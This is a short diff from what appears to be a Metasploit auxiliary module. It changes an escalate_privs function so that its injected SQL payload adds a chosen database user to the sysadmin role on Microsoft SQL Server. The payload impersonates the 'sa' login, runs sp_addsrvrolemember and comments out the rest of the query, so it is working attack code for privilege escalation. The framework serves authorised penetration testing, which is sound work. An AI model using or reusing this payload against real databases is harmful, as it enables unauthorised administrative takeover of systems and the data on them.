@@ -190,10 +190,10 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   # Attempt to escalate privileges
-  def escalate_privs(imp_user,db_user)
+  def escalate_privs(db_user)
 
     # Setup Query - Impersonate the first sysadmin user on the list
-    evil_sql = "1;EXECUTE AS LOGIN = 'sa';EXEC sp_addsrvrolemember 'MyUser1','sysadmin';Revert;--"
+    evil_sql = "1;EXECUTE AS LOGIN = 'sa';EXEC sp_addsrvrolemember '#{db_user}','sysadmin';Revert;--"
 
     # Execute Query
     mssql_query(evil_sql)
